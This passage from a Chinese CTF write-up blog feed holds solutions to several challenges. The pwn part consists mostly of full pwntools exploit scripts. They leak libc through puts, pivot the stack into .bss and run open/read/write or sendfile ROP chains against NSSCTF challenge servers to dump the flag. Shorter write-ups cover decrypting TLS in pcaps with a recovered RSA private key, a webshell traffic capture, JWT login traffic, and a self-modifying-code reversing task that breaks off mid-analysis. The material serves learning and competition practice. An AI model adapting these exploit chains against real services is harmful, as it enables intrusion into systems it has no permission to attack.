class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(bss + <span class="number">0x200</span> - <span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>开始直接用system(&#x2F;bin&#x2F;sh)打失败了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>execve被禁了</p>
<p>用ORW</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = (</span><br><span class="line">    <span class="comment"># 1. 在内存中写入目标文件路径 &quot;./flag\x00&quot;（末尾补\x00对齐8字节）</span></span><br><span class="line">    <span class="string">b&quot;./flag\x00\x00&quot;</span>  <span class="comment"># 字符串占6字节，补2个\x00凑8字节，存放在栈上</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 调用open函数打开文件：open(&quot;./flag&quot;, O_RDONLY)</span></span><br><span class="line">    + p64(<span class="number">0x4011C5</span>)    <span class="comment"># pop rdi; ret（用于给rdi传参）</span></span><br><span class="line">    + p64(bss + <span class="number">0x200</span>) <span class="comment"># rdi = 字符串存放地址（./flag的地址）</span></span><br><span class="line">    + p64(pop_rsi)     <span class="comment"># pop rsi; ret（用于给rsi传参）</span></span><br><span class="line">    + p64(<span class="number">0</span>)           <span class="comment"># rsi = 0（O_RDONLY，只读模式）</span></span><br><span class="line">    + p64(open_addr)   <span class="comment"># 调用open函数，此时栈顶为open地址，执行后打开文件</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 调用read函数读取文件内容：read(fd, buffer, size)</span></span><br><span class="line">    + p64(<span class="number">0x4011C5</span>)    <span class="comment"># pop rdi; ret</span></span><br><span class="line">    + p64(<span class="number">3</span>)           <span class="comment"># rdi = 3（假设open返回的文件描述符为3）</span></span><br><span class="line">    + p64(pop_rsi)     <span class="comment"># pop rsi; ret</span></span><br><span class="line">    + p64(buffer_addr) <span class="comment"># rsi = 缓冲区地址（存放读取内容的内存地址）</span></span><br><span class="line">    + p64(pop_rdx)     <span class="comment"># pop rdx; ret</span></span><br><span class="line">    + p64(<span class="number">0x100</span>)       <span class="comment"># rdx = 0x100（读取的字节数）</span></span><br><span class="line">    + p64(read_addr)   <span class="comment"># 调用read函数，读取文件内容到缓冲区</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 调用write函数输出内容：write(stdout, buffer, size)</span></span><br><span class="line">    + p64(<span class="number">0x4011C5</span>)    <span class="comment"># pop rdi; ret</span></span><br><span class="line">    + p64(<span class="number">1</span>)           <span class="comment"># rdi = 1（stdout，标准输出）</span></span><br><span class="line">    + p64(pop_rsi)     <span class="comment"># pop rsi; ret</span></span><br><span class="line">    + p64(buffer_addr) <span class="comment"># rsi = 缓冲区地址（之前存放读取内容的地址）</span></span><br><span class="line">    + p64(pop_rdx)     <span class="comment"># pop rdx; ret</span></span><br><span class="line">    + p64(<span class="number">0x100</span>)       <span class="comment"># rdx = 0x100（输出的字节数）</span></span><br><span class="line">    + p64(write_addr)  <span class="comment"># 调用write函数，将读取到的flag输出到屏幕</span></span><br></pre></td></tr></table></figure>

<p>20*8 &#x3D; 160 &gt;0x80所以不能，最终用open  + sendflie成功</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动远程连接</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">24512</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">leave_ret = <span class="number">0x40120F</span></span><br><span class="line"><span class="comment"># 快捷函数</span></span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: io.sendafter(a, b)</span><br><span class="line">ru = <span class="keyword">lambda</span> a: io.recvuntil(a)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">inter = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">padding = offset + <span class="number">0x8</span></span><br><span class="line">bss = <span class="number">0x404020</span> + <span class="number">0x700</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次栈迁移：将rbp劫持到bss段</span></span><br><span class="line">pay_pivot = cyclic(offset) + p64(bss + offset) + p64(<span class="number">0x4011EF</span>)  <span class="comment"># read -&gt; bss+off</span></span><br><span class="line">sa(<span class="string">b&#x27;Please enter your name!\n&#x27;</span>, pay_pivot)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment"># 泄露puts地址</span></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="number">0x4011C5</span>, <span class="number">0x404018</span>, <span class="number">0x401060</span>,     <span class="comment"># pop_rdi; puts_got; puts@plt</span></span><br><span class="line">    <span class="number">0x4011BB</span>, bss + offset + <span class="number">0x200</span>, <span class="number">0x4011EF</span>, <span class="comment"># pop_rbp; read -&gt; next stage</span></span><br><span class="line">    cyclic(<span class="number">0x50</span>),</span><br><span class="line">    bss - <span class="number">0x8</span>, leave_ret                      <span class="comment"># leave; ret</span></span><br><span class="line">)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析puts地址</span></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdx_rbx = libc_base + <span class="number">0x904a9</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2be51</span></span><br><span class="line">pop_rcx = libc_base + <span class="number">0x3d1ee</span></span><br><span class="line"></span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">sendfile = libc_base + libc.sym[<span class="string">&#x27;sendfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&quot;./flag\x00\x00&quot;</span> + p64(<span class="number">0x4011C5</span>) + p64(bss + <span class="number">0x200</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload3 += p64(<span class="number">0x4011C5</span>) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(<span class="number">3</span>) + p64(pop_rdx_rbx) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rcx) + p64(<span class="number">0x40</span>) + p64(sendfile)</span><br><span class="line">payload3 +=  p64(bss + <span class="number">0x200</span>)+ p64(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="NSSRound-14-Basic-rbp"><a href="#NSSRound-14-Basic-rbp" class="headerlink" title="[NSSRound#14 Basic]rbp"></a>[NSSRound#14 Basic]rbp</h4><p>这题就是0x210可以用ORW,我一开始用sendflie可是没通。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep &quot;pop rcx ; ret&quot;</span><br><span class="line">0x0000000000118d4f : pop rcx ; ret 0xf66</span><br></pre></td></tr></table></figure>

<p>感觉是不是0xf66导致pop rcx不能用，就直接用orw了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">banary = <span class="string">&quot;./rbp&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span></span><br><span class="line">port = <span class="number">28184</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">iuu32 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">iuu64 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">uheap = <span class="keyword">lambda</span> : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">offset = <span class="number">0x210</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401353</span></span><br><span class="line">pop_rbp=<span class="number">0x00000000004011bd</span></span><br><span class="line">read=<span class="number">0x0000000000401292</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040121d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x404060</span> + <span class="number">0x700</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401351</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;try it&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x210</span>+p64(bss+<span class="number">0x210</span>)+p64(read)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rbp)+p64(bss + offset + <span class="number">0x200</span>)+p64(read)</span><br><span class="line">payload=payload.ljust(<span class="number">0x210</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">libcbase=uu64()-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libcbase;&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">open</span>=libcbase+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libcbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libcbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdx=libcbase+<span class="number">0x0000000000142c92</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">flag_addr=bss + <span class="number">0x200</span></span><br><span class="line">payload=<span class="string">b&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(ret)+p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)+p64(elf.bss(<span class="number">0x100</span>))+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(elf.bss(<span class="number">0x100</span>))+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(write)</span><br><span class="line">payload=payload.ljust(<span class="number">0x210</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss + <span class="number">0x200</span>)+p64(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>栈迁移专题学习</category>
      </categories>
  </entry>
  <entry>
    <title>流量分析</title>
    <url>/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>开始流量学习。记录做题为主</p>
<h2 id="ssl"><a href="#ssl" class="headerlink" title="ssl"></a>ssl</h2><p>先过滤http</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1.png" alt="1"></p>
<p>http追踪流</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.png" alt="1"></p>
<p>看到ssl.log就是key。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.png" alt="1"></p>
<p>将其另存至本地。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/5.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/6.png" alt="1"></p>
<p>导入秘钥解密。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/7.png" alt="1"></p>
<p>多了几条http</p>
<p>追踪http流</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/8.png" alt="1"></p>
<p>就可以得到想要的东西。</p>
<h2 id="DDCTF2018-流量分析"><a href="#DDCTF2018-流量分析" class="headerlink" title="[DDCTF2018]流量分析"></a>[DDCTF2018]流量分析</h2><p>这也是个ssl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp contains &quot;KEY&quot;</span><br></pre></td></tr></table></figure>

<p>找key</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.1.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.2.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.3.png" alt="1"></p>
<p>[base64转PNG](<a href="https://rtool.cn/base64-to-image.html">阿图工具箱 - Base64转图片工具 - 免费在线Base64解码图片转换器</a>)</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/key.png" alt="1"></p>
<p>[提取文字](<a href="https://www.onlineocr.net/zh_hant/">免費在線OCR - 將PDF轉換為Word或圖像轉換為文本</a>)将其保存为key.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class="line">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class="line">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class="line">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class="line">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class="line">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class="line">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class="line">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class="line">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class="line">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class="line">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class="line">/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class="line">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>将key.txt导入</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.4.png" alt="1"></p>
<p>发现多出现了几条http的包</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.5.png" alt="1"></p>
<p>追踪一下http流就可以得到最终信息了</p>
<h2 id="buuctf-秘密文件"><a href="#buuctf-秘密文件" class="headerlink" title="buuctf 秘密文件"></a>buuctf 秘密文件</h2><p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.1.png" alt="1"></p>
<p>搜素flag。</p>
<p>在FTP选择最总TCP流。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.2.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.3.png" alt="1"></p>
<p>发现RAR，binwalk提取一下，爆破密码。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.4.png" alt="1"></p>
<p>解压即可得到flag。</p>
<h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>过滤出http post的数据包</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.1.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.2.png" alt="1"></p>
<p>发现可疑的文件,继续看。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.3.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.4.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RDpcd2FtcDY0XHd3d1x1cGxvYWRcNjY2Ni5qcGc  base64 --&gt;D:\wamp64\www\upload\6666.jpg</span><br></pre></td></tr></table></figure>

<p>紧接着是FF D8发现是JPG的开头复制到010里面保存。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/666.jpg" alt="1"></p>
<p>找到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Th1s_1s_p4sswd_!!!</span><br></pre></td></tr></table></figure>

<p>继续往下看</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.5.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.6.png" alt="1"></p>
<p>发现zip头</p>
<p>提取放到010保存到zip,用密码解压即可得到flag</p>
<h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><p>问一:</p>
<p>该网站使用了______认证方式</p>
<p>http contains “login”过滤先追踪http流</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/jwt1.1.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/jwt1.2.png" alt="1"></p>
<p>可以看到是jwt</p>
<p>问2：</p>
<p>id和username是______</p>
<p>先http contains “whoami”过滤，whoami(查看当前系统用户的命令)的流量包。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/jwt2.1.png" alt="1"></p>
<p>追踪命令成功的http流，过滤把tokenbase64解密</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/jwt2.2.png" alt="1"></p>
<p>id : 10087 username:admin</p>
]]></content>
      <categories>
        <category>MISC</category>
        <category>流量分析</category>
      </categories>
  </entry>
  <entry>
    <title>[网鼎杯 2020 青龙组]jocker</title>
    <url>/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/</url>
    <content><![CDATA[<p>开始网鼎杯的jocker学习</p>
<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/1.png" alt="1"></p>
<p>修复sp</p>
<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/2.png" alt="2"></p>
<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/3.png" alt="3"></p>
<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/4.png" alt="4"></p>
<p>可是encrypt函数还是进不去</p>
<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/5.png" alt="5"></p>
<p>这是个smc动调解密函数，进入函数后从text:00401500的定义头道endp进行u(undefine)再在定义头p重定义函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">encrypt</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1[<span class="number">19</span>]; <span class="comment">// [esp+1Ch] [ebp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+68h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  qmemcpy(v1, &amp;unk_403040, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">18</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span>)(a1[i] ^ Buffer[i]) != v1[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wrong ~&quot;</span>);</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;come here&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到加密函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 预定义的 unk_403040 数组</span></span><br><span class="line">unk_403040 = [</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x56</span>,</span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x06</span>,</span><br><span class="line">    <span class="number">0x0C</span>, <span class="number">0x3C</span>, <span class="number">0x1F</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0x6B</span>, <span class="number">0x57</span>, <span class="number">0x59</span>,</span><br><span class="line">    <span class="number">0x0D</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Buffer 字符串</span></span><br><span class="line">buffer_str = <span class="string">&#x27;hahahaha_do_you_find_me?&#x27;</span></span><br><span class="line"><span class="comment"># 解密过程</span></span><br><span class="line">decrypted = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(unk_403040)):</span><br><span class="line">    <span class="comment"># 异或操作</span></span><br><span class="line">    decrypted_char = <span class="built_in">chr</span>(unk_403040[i] ^ <span class="built_in">ord</span>(buffer_str[i]))</span><br><span class="line">    decrypted += decrypted_char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted string:&quot;</span>, decrypted)</span><br><span class="line"><span class="comment">#Decrypted string: flag&#123;d07abccf8a410c</span></span><br></pre></td></tr></table></figure>

<p>得到了一半flag，我们刚刚分析的时候有个finally的函数进去看看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">finally</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">__time32_t</span> *Time; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">9</span>]; <span class="comment">// [esp+13h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;%tp&amp;:&quot;</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  v5 = rand() % <span class="number">100</span>;</span><br><span class="line">  v4[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;v4[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (v4[(<span class="type">unsigned</span> __int8)v4[<span class="number">5</span>]] != a1[(<span class="type">unsigned</span> __int8)v4[<span class="number">5</span>]]) == v5 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)Time);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;I hide the last part, you will not succeed!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据最后一个字符 ‘}’ 猜测</p>
